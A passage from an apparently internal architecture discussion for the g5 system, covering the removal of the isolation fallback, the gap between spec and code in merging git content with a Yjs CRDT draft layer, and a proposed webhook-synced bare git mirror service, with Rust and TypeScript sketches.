  ✗ KrunvmBackend: krunvm found at /usr/bin/krunvm, but /dev/kvm is not accessible
    → Check: ls -la /dev/kvm
    → Fix: sudo usermod -aG kvm $USER && newgrp kvm
    → Or (if virtualization not enabled): Enable VT-x/AMD-V in BIOS

Exit code: 5
```

### 11.7 Spec Impact

| Spec File | Change |
|---|---|
| `config.semlift.md` | Remove `fallback` field from `IsolationConfig`. Remove `default_isolation_fallback` function. Remove `G5D_ISOLATION_FALLBACK` env var. |
| `config.semlift.md` | Remove `fallback` from `WorkspaceIsolationConfig`. |
| `isolation.semlift.md` | Rewrite backend selection algorithm: remove fallback step. On probe failure with `mode: microvm`, return `G5dError::IsolationUnavailable` (exit 5). |
| `isolation.semlift.md` | Update domain context: remove "process isolation is an automatic fallback." Replace with "process isolation is an explicit opt-in mode." |
| `g5.semlift.md` workspace.yaml example | Remove `fallback: process` from the canonical example. |
| `g5.semlift.md` § overview | Change "microVM isolation backends (krunvm, WSL2, process fallback)" to "microVM isolation backends (krunvm, WSL2) or explicit process mode." |
| Generated code: `g5d/src/config.rs` | Remove `fallback` field. |
| Generated code: `g5d/src/worker/mod.rs` | Remove fallback logic in backend selection. |
| ARCHITECTURE_DISCUSSION.md §9.10.2 | Remove `fallback: process` from workspace.yaml example. |

### 11.8 Fix the §9.10.2 Example

The workspace.yaml example in §9.10.2 above already included `fallback: process`. That line is wrong per this decision and must be removed. The corrected config block:

```yaml
# .g5/workspace.yaml
isolation:
  mode: microvm
  # NO fallback field. microvm or fail.

  image: "ghcr.io/acme/g5-worker:latest"

  registry_auth:
    credential_helper: "gcloud"
    pull_secret: "acme-ghcr-pull"

  resources:
    cpus: 4
    memory_gb: 16
```

### 11.9 Open Questions (Isolation Modes)

28. **Should `mode: microvm` be the default, or should default be "probe"?** Current: default is `microvm`, which means a fresh install on a machine without krunvm immediately fails. Alternative: default could be `auto` which probes and uses the best available, but logs a loud WARNING if only process is available. Counter-argument: `auto` is just `fallback` with extra steps — it still silently degrades. **Recommendation: default is `microvm`. Fail early, fail loud.**
29. **Intel Mac story.** libkrun doesn't support x86_64 HVF. The only option for Intel Macs is `mode: process`. Should we detect Intel Mac and auto-set `mode: process` with a warning? Or require explicit config? **Recommendation: require explicit config. Don't silently weaken security based on architecture detection.**
30. **Should g5-api reject task submissions from workspaces with `mode: process` on the multi-tenant SaaS platform?** The platform operator knows that process mode is unsafe for multi-tenant. Should the API enforce this? **Recommendation: yes. In SaaS mode, g5-api should reject `mode: process` workspaces with a 403 and a message explaining that microvm is required for the hosted platform.**

---

## §12 — Git Content + CRDT Merge on the UI: Design vs. Implementation Gap Analysis

### 12.1 The Question

How does the browser display file content that combines **git base state** with **CRDT draft overlay**? Two separate data paths exist — REST file content from git, and Yjs CRDT documents via WebSocket — and they must converge into a single editing experience.

### 12.2 What the Specs Describe

The spec system describes a **two-layer content model** with clear separation of responsibilities:

#### 12.2.1 Server-Side Content Authority (ontology_service spec, routes/ontology spec)

> "Content is always read from git (not cached in Postgres). The response includes a `draftDirty` flag indicating whether the content includes uncommitted CRDT edits."

The `GET /api/v1/workspaces/:workspaceId/ontology/:nodeId/content` endpoint is specified to:
1. Read base content from `git show {head_commit}:{file_path}`
2. If a `draft_session` exists, apply the Yjs CRDT state as an overlay
3. Return merged content with `draftDirty: boolean`

This implies **server-side merging** for the REST content endpoint — the API returns content that already incorporates draft edits.

#### 12.2.2 Client-Side CRDT Authority (client/data-layer/crdt spec)

The CRDT spec tells a different story:

> "The Y.Doc is the source of truth for draft content. The REST API only stores committed snapshots. Components must read draft content from the Y.Doc, not from REST API responses."

And:

> "Y.Doc contains named shared types: Y.Text keyed by relative file path (e.g., `src/main.rs`), Y.XmlFragment keyed by file path with `_rich` suffix for ProseMirror binding, Y.Map named `_meta` containing `dirty_files` sub-map."

This describes a **client-side merging** model where the Y.Doc is the canonical editing surface, and REST content is only for initial state or non-draft scenarios.

#### 12.2.3 Draft Management Spec (workspace-page/draft-management)

The DraftEditor spec explicitly describes the merge lifecycle:

> "On mount, calls `useDraftCRDT(workspaceId, branchId)` to obtain the shared Y.Doc and WebsocketProvider. For code files: binds y-monaco to the Monaco editor instance. The Yjs Y.Text shared type is accessed via `yDoc.getText(filePath)` — one text type per file path within the shared document."

And for gutter diffs:

> "Computed by diffing the base commit content (fetched via `GET /api/v1/branches/:branchId/files/:filePath?ref=<baseCommit>`) against the current CRDT state."

This confirms the intended architecture: **git content is the base, CRDT is the editing layer, the editor binds to the CRDT document, and git content is used only for diff computation against the draft state.**

#### 12.2.4 Server-Side CRDT Authority (crdt/authority spec)

The server's `CrdtAuthority` manages in-memory `DocumentHandle` instances (one per workspace+branch), speaks y-websocket binary protocol, and persists updates to Postgres via the `PersistenceLayer`. Cold-start loads from `draft_sessions.yjs_state` + replays `draft_updates`.

**Critical architectural question**: Who seeds the Y.Doc with git content when a draft session is first created? The persistence spec says `create_draft` inserts `yjs_state = empty bytes (\x)`. That's an **empty document**. The spec does NOT describe a step where git file content is loaded into the Y.Doc.

### 12.3 What the Generated Code Actually Does

#### 12.3.1 Content Pipeline (WorkspacePage.tsx)

The `ContentDispatch` component in WorkspacePage.tsx wires things as follows:

```
// For code nodes:
const fileContent = useFileContent(branchId, nodeId);   // REST → git content
const crdt = useDraftCRDT(workspaceId, branchId);       // Yjs WebSocket

<CodeEditor
  content={fileContent}    // ← raw git content string
  yjsDoc={crdt.yDoc}      // ← Yjs document (unused!)
/>

// For spec nodes:
const nodeContent = useNodeContent(nodeId);              // REST → git content
const crdt = useDraftCRDT(workspaceId, branchId);       // Yjs WebSocket

<SpecEditor
  content={nodeContent}    // ← raw git content string
  yjsDoc={crdt.yDoc}      // ← Yjs document (unused!)
/>
```

Both editors receive **both** the REST content string and the Yjs document as props. But they use only the content string.

#### 12.3.2 CodeEditor.tsx — yjsDoc Is Destructured but Unused

```typescript
// Line 169:
yjsDoc: _yjsDoc,   // prefixed with _ = intentionally unused
```

The editor renders `content.split('\n')` into a manual line-by-line syntax-highlighted view. There is no Monaco instance. There is no y-monaco binding. The `yjsDoc` prop is a dead prop.

#### 12.3.3 SpecEditor.tsx — yjsDoc Is Passed but Not Bound

The SpecEditor receives `yjsDoc` as a prop and stores it, but the rich editing mode uses `parseMarkdownToBlocks(content)` — parsing the REST content string into blocks for rendering. There is no ProseMirror/Tiptap instance, no y-prosemirror binding. The `yjsDoc` prop is decorative.

#### 12.3.4 DraftEditor.tsx — Correct Architecture, Partial Implementation

DraftEditor is the **only component** that correctly implements the spec:

1. Calls `useDraftCRDT(workspaceId, branchId)` to get the Y.Doc
2. For source mode: accesses `yDoc.getText(filePath)` and sets up `y-monaco` binding
3. For rich mode: accesses `yDoc.getXmlFragment(filePath)` and sets up `y-prosemirror` binding
4. Observes Y.Text/Y.XmlFragment for dirty state tracking
5. Fetches base content via `useFileContent` for gutter diff computation

**But**: DraftEditor is not used anywhere in the current content pipeline. `ContentDispatch` in WorkspacePage.tsx renders `CodeEditor` and `SpecEditor` directly — it never renders `DraftEditor`.

#### 12.3.5 crdt.ts — Complete and Correct

The CRDT module is fully implemented and architecturally sound:
- `CrdtDocumentStore` singleton with ref-counted `(Y.Doc, WebsocketProvider)` pairs
- Token acquisition via `POST /api/v1/auth/ws-ticket`
- Sync state machine (syncing → synced ↔ syncing, any → desynced)
- Token refresh on reconnect (5-minute lifetime)
- Awareness protocol with debounced participant tracking
- 2-second grace period on release for rapid tab switches

The CRDT plumbing works. Nothing consumes it for actual editing.

### 12.4 The Architectural Gaps

#### GAP 1: No Content Seeding into Y.Doc

When a draft session is created (`POST /api/v1/branches/:branchId/drafts`), the `yjs_state` starts as empty bytes. Nobody loads the git file contents into the Y.Doc. When a Y.Doc is cold-started on the server and a client connects, the client receives an **empty document**, not the file's git content.

**Where seeding should happen**: On the server, when `PersistenceLayer::ensure_session()` creates a new draft session, it should:
1. Read the current git content for all files in the branch
2. Create a Y.Doc, populate `Y.Text` entries keyed by file path
3. Serialize as `yjs_state` and store in the new `draft_sessions` row

Alternatively, seeding could happen **lazily per file** — when a client first accesses `yDoc.getText("src/main.rs")` and the shared type is empty, a protocol extension could request the server to seed that file's content from git.

#### GAP 2: ContentDispatch Bypasses DraftEditor

The WorkspacePage's `ContentDispatch` renders `CodeEditor` and `SpecEditor` directly, passing raw REST content. It should render `DraftEditor` when a draft session is active, which would then bind the Y.Doc to the editor. The current flow is:

```
ContentDispatch → CodeEditor(content=git_string)      ← No CRDT
ContentDispatch → SpecEditor(content=git_string)       ← No CRDT
```

The intended flow (per the draft-management spec) is:

```
ContentDispatch → DraftEditor → Monaco (via y-monaco binding to Y.Doc)
ContentDispatch → DraftEditor → ProseMirror (via y-prosemirror binding to Y.Doc)
```

With fallback to read-only CodeEditor/SpecEditor when no draft session exists.

#### GAP 3: CodeEditor Has No Monaco Instance

CodeEditor is a custom syntax-highlighted viewer that renders content as `<pre>` blocks with line numbers. The spec says it should integrate Monaco for source editing. Without Monaco, there is nothing for `y-monaco` to bind to. The editor would need to be rewritten to wrap `@monaco-editor/react`.

#### GAP 4: SpecEditor Has No ProseMirror/Tiptap Instance

SpecEditor parses markdown into blocks with `parseMarkdownToBlocks()` and renders them as React components. The spec says it should use Tiptap/ProseMirror for rich editing. Without ProseMirror, there is nothing for `y-prosemirror` to bind to.

#### GAP 5: Server `get_node_content` Doesn't Apply CRDT Overlay

The ontology routes spec says the content endpoint should apply CRDT overlay and return `draftDirty`. But the handler logic described merely delegates to a file/git service — there's no step where the handler loads the in-memory Y.Doc from `DocumentStore` and extracts the merged content. This is consistent with the client-side CRDT model (where the Y.Doc IS the content), but inconsistent with the stated REST behavior.

### 12.5 Proposed Content Pipeline Architecture

Two viable models exist. They are NOT compatible — we must choose one.

#### Option A: CRDT-First (Recommended)

The Y.Doc is the **sole source of truth** for all file content during an active draft. REST content endpoints are read-only views that don't participate in the editing loop.

```
┌─────────────┐         ┌──────────────┐         ┌────────────┐
│   Browser    │◄──ws───►│   g5-api     │◄──pg───►│  Postgres  │
│              │         │  CrdtAuth    │         │ yjs_state  │
│  Y.Doc ←───────────►  │  DocumentHdl │         │ draft_upd  │
│  │                     │              │         └────────────┘
│  ├─ getText("f.rs")    │  Y.Doc (mem) │
│  │   └─► Monaco        │  │           │         ┌────────────┐
│  ├─ getXmlFrag("s.md") │  └─ seeded   │◄──git──►│  git repo  │
│  │   └─► ProseMirror   │    from git  │         └────────────┘
│  └─ getMap("_meta")    │              │
│                        └──────────────┘
└─────────────┘

Lifecycle:
1. Draft created → server reads git files → seeds Y.Doc → persists yjs_state
2. Client connects → y-websocket sync → client gets seeded content
3. Client binds Y.Doc to editor → all edits go through CRDT
4. Gutter diffs: client fetches base content via REST for comparison only
5. Commit: server extracts dirty file contents from Y.Doc → git add/commit/push
```

**Content pipeline per file open:**
1. `useDraftCRDT(wsId, branchId)` → returns `{ yDoc, syncState }`
2. `DraftEditor` mounts with `filePath` → accesses `yDoc.getText(filePath)`
3. If `yText.length === 0` and file exists in git → **server must have seeded** (or client seeds on first access)
4. Monaco/ProseMirror binds to the Y.Text/Y.XmlFragment
5. All edits flow through Yjs — no REST writes for content during editing
6. `useFileContent(branchId, filePath)` fetches git base for gutter diff only

**For read-only (no draft session):**
1. `useDraftSession(branchId)` returns null → no CRDT connection
2. `ContentDispatch` renders `CodeEditor`/`SpecEditor` in read-only mode with REST content

**Seeding strategy (server-side, eager):**
When `DraftService::create_draft()` creates a new session:
```rust
// 1. List all files in the branch
let files = git_service.list_files(repo_path, head_commit).await?;

// 2. Create a Y.Doc and populate it
let doc = yrs::Doc::new();
let mut txn = doc.transact_mut();
for file in &files {
    let content = git_service.read_file(repo_path, head_commit, &file.path).await?;
    let text = txn.get_or_insert_text(&file.path);
    text.insert(&mut txn, 0, &content);
}

// 3. Encode and store
let state = txn.encode_state_as_update_v1(&yrs::StateVector::default());
// INSERT INTO draft_sessions ... yjs_state = state
```

**Pros:**
- Single source of truth — no split-brain between REST and CRDT
- Collaborative editing "just works" — all connected clients see the same state
- Matches the crdt spec's stated invariant: "Components must read draft content from the Y.Doc"
- Offline edits merge cleanly via CRDT semantics

**Cons:**
- Seeding large repos (thousands of files) into a Y.Doc is expensive (memory, time)
- Every file in the repo is loaded into the CRDT, even if only 2 files are edited
- Y.Doc size grows with repo size, not edit count

**Mitigation for large repos — lazy per-file seeding:**
Instead of seeding all files eagerly, seed files lazily when a client first accesses them:

1. Draft created → `yjs_state` starts empty (current behavior)
2. Client opens `src/main.rs` → `yDoc.getText("src/main.rs")` — Y.Text is empty
3. Client sends a custom message: `{ type: 'seed', filePath: 'src/main.rs' }`
4. Server reads git content → inserts into server's Y.Doc → broadcasts update to all clients
5. Client receives the seeded content via y-websocket sync
6. Subsequent clients opening the same file see the already-seeded content

This avoids loading all files upfront. The `_meta.dirty_files` map tracks which files have been modified (vs. just seeded).

**Custom y-websocket message type for seed request:**
The y-websocket protocol supports custom message types (byte prefix > 2). We can define:
- `messageType = 3` → seed request: `[3, ...utf8_filepath_bytes]`
- Server receives, reads git content, inserts into Y.Doc, which triggers automatic broadcast

#### Option B: REST-Merged (Alternative)

The REST endpoint applies CRDT overlay server-side. The client always fetches content via REST. CRDT is used only for real-time sync between concurrent editors, not as the content source.

```
Browser                       g5-api                        Storage
  │                             │                              │
  │  GET /ontology/:id/content  │                              │
  │───────────────────────────►│                              │
  │                            │──► git show HEAD:file.rs ───►│
  │                            │◄── base content ────────────│
  │                            │──► DocumentStore.get(ws,br)  │
  │                            │    ├── Y.Doc in memory?      │
  │                            │    │   → extract Y.Text      │
  │                            │    │   → apply as overlay    │
  │                            │    └── no doc? → return base │
  │◄── merged content ────────│                              │
  │    draftDirty: true        │                              │
```

**Pros:**
- No Y.Doc seeding needed — git is always the base, CRDT delta applied on read
- REST consumers (non-editor views) get correct content without CRDT connection
- Smaller Y.Doc — only stores deltas, not full file content

**Cons:**
- Split-brain risk: REST response and Y.Doc may diverge during rapid editing
- Editor must still bind to Y.Doc for collaborative editing — REST is only for initial load
- Server must merge git + CRDT on every REST read — adds latency
- More complex than Option A for real-time editing scenarios

### 12.6 Recommendation: Option A (CRDT-First) with Lazy Per-File Seeding

**Decision**: Option A. The Y.Doc is the sole source of truth during an active draft session.

**Rationale:**
1. The CRDT module (crdt.ts) is already built correctly for this model
2. The DraftEditor component implements the correct architecture — it just needs to be wired in
3. Lazy per-file seeding avoids the large-repo memory problem
4. No split-brain between REST and CRDT
5. The server's CrdtAuthority already has the in-memory Y.Doc infrastructure

### 12.7 Required Spec Changes

| # | Spec File | Change |
|---|-----------|--------|
| 1 | `g5-api/crdt/authority.semlift.md` | Add `handle_seed_request()` method that reads git content for a requested file and inserts into Y.Doc. Define custom message type 3 for seed requests. |
| 2 | `g5-api/services/draft_service.semlift.md` | `create_draft()` initializes `_meta` Y.Map with empty `dirty_files` but does NOT pre-seed file content (lazy seeding). |
| 3 | `g5-api/routes/ontology.semlift.md` | `get_node_content` should check if a draft session exists. If so, read content from the in-memory Y.Doc via `DocumentStore::get_handle()`. If the doc is not in memory, load from `draft_sessions.yjs_state`. Fallback to git if no draft. Set `draftDirty` accordingly. |
| 4 | `client/workspace-page/center-panel.semlift.md` | `ContentView` should render `DraftEditor` wrapping `CodeEditor`/`SpecEditor` when a draft session is active. `DraftEditor` provides the CRDT context; the inner editor binds to Y.Doc. When no draft is active, render editors in read-only mode with REST content. |
| 5 | `client/workspace-page/center-panel.semlift.md` | `CodeEditor` must integrate `@monaco-editor/react` with `y-monaco` binding. Replace custom line renderer with Monaco. |
| 6 | `client/workspace-page/center-panel.semlift.md` | `SpecEditor` must integrate Tiptap + `y-prosemirror` binding. Replace `parseMarkdownToBlocks()` rendering path with ProseMirror for editable mode; keep block rendering for read-only mode. |
| 7 | `client/data-layer/crdt.semlift.md` | Add `seedFile(filePath: string)` method to `CrdtDocumentStore` that sends the custom seed request message (type 3) to the server via the WebSocket. |
| 8 | `client/data-layer/hooks.semlift.md` | `useFileContent` should be documented as "for read-only views and gutter diff computation only — never as the editing content source during active drafts." |

### 12.8 Required Code Changes

| # | File | Change |
|---|------|--------|
| 1 | `WorkspacePage.tsx` | `ContentDispatch` → when draft session active, render `DraftEditor` wrapping the editor, not `CodeEditor`/`SpecEditor` directly. Pass `filePath`, `mode`, `branchId`, `workspaceId`. |
| 2 | `CodeEditor.tsx` | Replace custom line renderer with `@monaco-editor/react`. Accept `yText: Y.Text \| null` prop. When `yText` provided, create `MonacoBinding(yText, editor, awareness)`. When null, render content string read-only. |
| 3 | `SpecEditor.tsx` | Add Tiptap editor with `y-prosemirror` plugin for rich mode. Accept `yXmlFragment: Y.XmlFragment \| null` prop. When provided, bind to ProseMirror. When null, use `parseMarkdownToBlocks` read-only rendering. |
| 4 | `DraftEditor.tsx` | Already mostly correct. Wire it into `ContentDispatch`. Add seed request: when `yDoc.getText(filePath).length === 0`, send seed message to server. |
| 5 | `crdt.ts` | Add `sendSeedRequest(provider, filePath)` function that sends a custom y-websocket message (type 3) with the file path. |
| 6 | Server: `authority.rs` | In `message_loop()`, handle incoming message type 3 (seed request). Read git content via `GitService`, insert into Y.Doc Y.Text for the requested file path. The standard y-websocket update broadcast propagates the seeded content to all clients. |
| 7 | Server: `draft_service.rs` | In `commit_draft()`, step "Extract dirty files from Yjs state" should iterate `_meta.dirty_files` map, extract each Y.Text's content from the Y.Doc, and write to the git working tree. |

### 12.9 Content Flow Diagram (After Fixes)

```
┌─ Browser ───────────────────────────────────────────────────────┐
│                                                                  │
│  WorkspacePage                                                   │
│    └─ ContentDispatch                                            │
│         │                                                        │
│         ├─ Draft active? ──YES──► DraftEditor                    │
│         │                           │                            │
│         │                           ├─ useDraftCRDT(ws, br)      │
│         │                           │   └─► Y.Doc + Provider     │
│         │                           │                            │
│         │                           ├─ yDoc.getText(filePath)    │
│         │                           │   └─ empty? → seedFile()   │
│         │                           │                            │
│         │                           ├─ mode=source?              │
│         │                           │   └─► Monaco + y-monaco    │
│         │                           │        binding to Y.Text   │
│         │                           │                            │
│         │                           └─ mode=rich?                │
│         │                               └─► Tiptap + y-prosemirror│
│         │                                    binding to Y.XmlFrag │
│         │                                                        │
│         └─ No draft ──────► CodeEditor (read-only, REST content) │
│                             SpecEditor (read-only, REST content) │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘

┌─ Server (g5-api) ───────────────────────────────────────────────┐
│                                                                  │
│  CrdtAuthority (per WS connection)                               │
│    │                                                             │
│    ├─ y-websocket sync handshake ◄──► client                    │
│    │                                                             │
│    ├─ message type 0-2: standard y-websocket (sync/update/aware) │
│    │                                                             │
│    └─ message type 3: SEED REQUEST                               │
│         ├─ parse filePath from payload                           │
│         ├─ git show HEAD:{filePath}                              │
│         ├─ doc.transact(|txn| {                                  │
│         │    let text = txn.get_or_insert_text(filePath);        │
│         │    if text.len() == 0 { text.insert(0, git_content) } │
│         │  })                                                    │
│         └─ Y.Doc update auto-broadcasts to all clients           │
│                                                                  │
│  DraftService::commit_draft()                                    │
│    ├─ CAS guard (SELECT FOR UPDATE)                              │
│    ├─ Load Y.Doc from DocumentStore or yjs_state                 │
│    ├─ For each dirty_file:                                       │
│    │    content = yDoc.getText(filePath).to_string()             │
│    │    write to git working tree                                │
│    ├─ git add → git commit → git push                            │
│    └─ DELETE draft_session + draft_updates                       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 12.10 Open Questions

31. **Should the seed request be a y-websocket custom message (type 3), or a separate REST call?** Custom message keeps everything on the CRDT channel and the response is automatic (Y.Doc update broadcast). A REST call would be simpler to implement but means the client must apply the response manually to the local Y.Doc. **Recommendation: custom message type 3.** The y-websocket protocol explicitly supports custom message types, and having the seed response flow through the normal CRDT sync pipeline avoids any race conditions.

32. **Lazy seeding race condition**: Two clients open the same file simultaneously. Both see `yText.length === 0` and send seed requests. The server must handle this idempotently — if the Y.Text already has content (seeded by the first request), the second seed is a no-op. The `if text.len() == 0` guard in the server's seed handler handles this.

33. **Rich mode seeding**: For spec files, seeding needs to populate both `Y.Text("file.md")` (for source mode) and `Y.XmlFragment("file.md_rich")` (for rich mode). Should the server parse markdown into ProseMirror XML structure for the XmlFragment? Or should the client handle the markdown→ProseMirror conversion after receiving the seeded Y.Text? **Recommendation: server seeds Y.Text only. Client-side conversion from Y.Text markdown to Y.XmlFragment ProseMirror structure happens in the DraftEditor when switching to rich mode.** This keeps the server simple and avoids requiring a markdown→ProseMirror parser in Rust.

34. **Memory budget for Y.Doc per branch**: With lazy seeding, a draft's Y.Doc grows as files are opened. For a repo with 500 files averaging 5KB each, fully opening everything yields ~2.5MB Y.Doc. The CRDT overhead (version vectors, tombstones) roughly doubles this to ~5MB. Is this acceptable? **Recommendation: yes, 5MB per branch is fine. The server spec already quotes 10KB–10MB as typical. Add a configurable `max_doc_size_bytes` limit (default 50MB) that rejects seed requests when exceeded.**

35. **REST `get_node_content` with draft overlay**: Should this endpoint still apply CRDT overlay for non-editor consumers (e.g., API integrations, webhooks)? If yes, the server needs to read from Y.Doc. If no, REST always returns git content and `draftDirty` is just a boolean flag. **Recommendation: yes, apply overlay. Non-editor consumers (CI previews, API clients) should see draft content when a draft is active. The server already has the Y.Doc in memory — reading a Y.Text is cheap (<1ms).**

---

## §13 — Git Content Serving: The Missing Layer Under Everything

### 13.1 The Deeper Problem

§12 proposed a CRDT-first content model where the Y.Doc is seeded from git. But that requires g5-api to be able to **read git content in the first place**. The CRDT seed, the REST file browser, the search indexer, the ontology content endpoint, the draft commit flow — they all call `git show {head_commit}:{file_path}` or `git ls-tree`. That command runs against a **local git repository**. Where is it?

This is the "git mirror" question: **how does g5-api, running as a stateless web service, access the contents of user repositories?**

### 13.2 What the Spec Says (Three Contradictory Models)

The root spec and child specs describe three different content resolution strategies, used interchangeably without acknowledging that they require fundamentally different infrastructure:

#### Model 1: "g5-api has its own git checkout"

Root spec §3.2:
> "g5-api reads from its own git checkout or shells out to `git show {head_commit}:{file_path}`"

Root spec §19 (IDE plugin view model):
> "User disconnects from all workers: Base layer falls back to g5-api git checkout"

This implies g5-api has a working copy of every repo it serves. This is the model where g5-api IS the git mirror.

#### Model 2: "g5-api has a cached bare repo"

Files spec (routes/files.semlift.md):
> "The file tree is read from the editor's git checkout (when an editor is connected) or from the cached bare repo via `git show` / `git ls-tree`."

Org service spec:
> "The docs repo git URL is generated as a local bare repo path: `file:///var/lib/g5/repos/{org_slug}/docs.git`"

This implies g5-api maintains bare clones. Bare repos support `git show` and `git ls-tree` but don't have a working tree. This is the git mirror model, implemented as bare clones.

#### Model 3: "Delegate to an editor/worker"

Files spec:
> "Editor connected: Delegate to the editor's git checkout via `GET /api/v1/instances/:id/files/{file_path}`. The editor returns content from its working tree with draft overlay applied."

Search indexer spec:
> "Read git tree at commit_sha via the g5d file API (HTTP call to the daemon) or by reading the bare repo directly."

This implies g5-api doesn't have the repo at all — it proxies requests to a connected g5d worker that has the checkout.

#### The contradiction

Model 3 only works when a worker is connected. But the whole point of the "no worker" fallback (§19 view model) is that the browser still works when no worker exists. The file tree, file content, ontology tree, and search all need to function without a worker. So either Model 1 or Model 2 must exist as the baseline.

### 13.3 What the Code Actually Has

**Nothing.** The generated `files.rs` route handler calls `state.workspace_service.get_file_content(&branch, &sanitized_path)`, but `workspace_service` has no `get_file_content` method. It's a dangling reference. There is:

- No `GitService` struct
- No `FileService` struct
- No bare repo path configuration
- No `git show` shell-out
- No `git2` usage in g5-api
- No repo storage directory convention
- No webhook handler to keep repos in sync

The `g5-common` crate defines a `GitRepo` type with `show_file(commit, path)`, but g5-api never instantiates one because it has no repo path to open.

### 13.4 What Actually Needs Git Access in g5-api

| Consumer | Operation | Frequency | Needs Working Tree? |
|----------|-----------|-----------|-------------------|
| File tree API | `git ls-tree HEAD:{path}` | Every sidebar expansion | No (bare OK) |
| File content API | `git show HEAD:{file_path}` | Every file open | No (bare OK) |
| Ontology content API | `git show HEAD:{file_path}` | Every node view | No (bare OK) |
| CRDT seed (§12) | `git show HEAD:{file_path}` | First file open in draft | No (bare OK) |
| Draft commit | Write files → `git add` → `git commit` → `git push` | Each commit | **Yes (needs working tree)** |
| Search indexer | `git ls-tree -r HEAD` + `git show` per file | On commit/sync events | No (bare OK) |
| Diff computation | `git diff base..head` | On diff view open | No (bare OK) |
| Git log/blame | `git log`, `git blame` | On demand | No (bare OK) |

Everything except draft commit works with a **bare repo**. Draft commit requires a working tree to stage files and create commits. But the commit flow is a special operation that could use a temporary checkout.

### 13.5 Proposed Architecture: Bare Mirror per Repo

g5-api maintains a **bare mirror** per repository, kept in sync via webhook-driven `git fetch`. This is the same pattern used by Gitea, GitLab, and every self-hosted CI system.

```
┌─────────────┐      webhook: push event      ┌──────────────┐
│  GitHub /    │──────────────────────────────►│   g5-api     │
│  GitLab /    │                               │              │
│  SCM host    │◄────── git fetch ────────────│  GitMirror   │
└─────────────┘                               │  Service     │
                                              │              │
           /var/lib/g5/mirrors/               │  ┌─────────┐ │
           ├── {sha256(url)}.git  ◄───────────┤  │ bare    │ │
           ├── {sha256(url)}.git              │  │ repos   │ │
           └── ...                            │  └─────────┘ │
                                              │              │
                                              │  Consumers:  │
                                              │  ├─ files.rs │
                                              │  ├─ ontology │
                                              │  ├─ search   │
                                              │  ├─ CRDT seed│
                                              │  └─ drafts   │
                                              └──────────────┘
```

#### 13.5.1 GitMirrorService

```rust
pub struct GitMirrorService {
    /// Base directory for bare mirrors
    /// Default: /var/lib/g5/mirrors (SaaS), ~/.g5/mirrors (self-hosted)
    mirror_dir: PathBuf,

    /// Connection pool for looking up repo URLs and credentials
    db: PgPool,

    /// SCM token manager for authenticated fetches
    scm_tokens: Arc<ScmTokenManager>,

    /// Lock map to prevent concurrent fetches on the same repo
    fetch_locks: DashMap<Uuid, Arc<tokio::sync::Mutex<()>>>,
}
```

**Core operations:**

| Method | Description |
|--------|-------------|
| `ensure_mirror(repo_id) -> Result<PathBuf>` | Returns path to bare mirror. If it doesn't exist, creates it via `git clone --bare`. If it exists, returns path immediately (no fetch). |
| `fetch(repo_id) -> Result<()>` | Fetches latest from remote into the bare mirror. Acquires per-repo lock to prevent concurrent fetches. Uses SCM token for auth. |
| `show_file(repo_id, commit, path) -> Result<Vec<u8>>` | Reads file content: `ensure_mirror` → open bare repo → `git show {commit}:{path}`. |
| `ls_tree(repo_id, commit, path, depth) -> Result<Vec<TreeEntry>>` | Lists directory: `ensure_mirror` → `git ls-tree [-r] {commit}:{path}`. |
| `diff_stat(repo_id, base, head) -> Result<DiffSummary>` | Computes diff between two commits. |
| `log(repo_id, branch, limit) -> Result<Vec<CommitInfo>>` | Returns commit log. |
| `handle_webhook(event) -> Result<()>` | On push webhook: identify repo → `fetch(repo_id)`. Debounced — multiple rapid pushes coalesce into one fetch. |

#### 13.5.2 Mirror Directory Convention

```
/var/lib/g5/mirrors/
├── {repo_id}.git/            ← bare clone, named by repo UUID
│   ├── HEAD
│   ├── config
│   ├── objects/
│   ├── refs/
│   └── ...
└── ...
```

Using `repo_id` (UUID from Postgres `repos` table) as the directory name avoids URL-encoding complexity and is guaranteed unique. The mapping from `repo_id` → remote URL is in Postgres.

#### 13.5.3 Webhook-Driven Sync

When a user or agent pushes to the remote (GitHub/GitLab), the SCM provider fires a webhook:

```
POST /api/v1/webhooks/:provider
```

The webhook handler:
1. Validates the webhook signature (HMAC-SHA256 for GitHub, token header for GitLab)
2. Extracts the repo identifier and pushed refs
3. Looks up the `repo_id` in Postgres
4. Calls `mirror_service.fetch(repo_id)`
5. Emits `branch.updated` events for affected workspace branches (triggers UI refresh)

**Fallback for missed webhooks**: A background task runs every 5 minutes, checking repos with `last_fetched_at < now() - interval '10 minutes'` and fetching them. This catches webhooks lost due to network issues.

#### 13.5.4 Lazy Initialization

Bare mirrors are created lazily — `ensure_mirror()` creates the initial clone on first access. This means:

1. User creates a workspace with a GitHub repo → `repos` row inserted with `git_url`
2. First time anyone opens the file tree → `ensure_mirror()` → `git clone --bare {url}` → bare mirror created
3. Subsequent accesses → `git show` / `git ls-tree` against the existing bare mirror
4. Webhook pushes → `git fetch` keeps the mirror up to date

Initial clone can be slow for large repos (10-60s). The API should:
- Return a partial response or loading indicator during initial clone
- Queue the clone as a background task and SSE/WS notify when ready
- For SaaS: pre-warm mirrors during workspace creation (async job)

#### 13.5.5 Draft Commit via Temporary Working Tree

Draft commit (§12, step: Y.Doc → git add → commit → push) needs a working tree. Using `git worktree` on the bare mirror:

```rust
async fn commit_draft_files(
    mirror: &GitMirrorService,
    repo_id: Uuid,
    branch: &str,
    head_commit: &str,
    dirty_files: Vec<(String, Vec<u8>)>,
    message: &str,
    author: &GitAuthor,
    auth: &GitAuth,
) -> Result<String, G5Error> {
    let bare_path = mirror.ensure_mirror(repo_id).await?;

    // 1. Create a temporary worktree from the bare mirror
    let worktree_dir = tempfile::tempdir()?;
    // git worktree add --detach <dir> <commit>
    let repo = git2::Repository::open(&bare_path)?;
    repo.worktree_add(worktree_dir.path(), head_commit)?;

    // 2. Write dirty files from Y.Doc into the worktree
    for (path, content) in &dirty_files {
        let full_path = worktree_dir.path().join(path);
        tokio::fs::create_dir_all(full_path.parent().unwrap()).await?;
        tokio::fs::write(&full_path, content).await?;
    }

    // 3. git add + commit
    let worktree_repo = git2::Repository::open(worktree_dir.path())?;
    // ... add, commit ...

    // 4. Push from worktree to remote
    // git push origin HEAD:refs/heads/{branch}
    // ... push with auth ...

    // 5. Update bare mirror (the push updated the remote; fetch to sync)
    mirror.fetch(repo_id).await?;

    // 6. Cleanup worktree
    // git worktree remove (happens when tempdir drops)

    Ok(new_commit_sha)
}
```

The worktree is ephemeral — created for the commit, destroyed after push. The bare mirror stays clean.

### 13.6 How This Connects to §12 (CRDT Seeding)

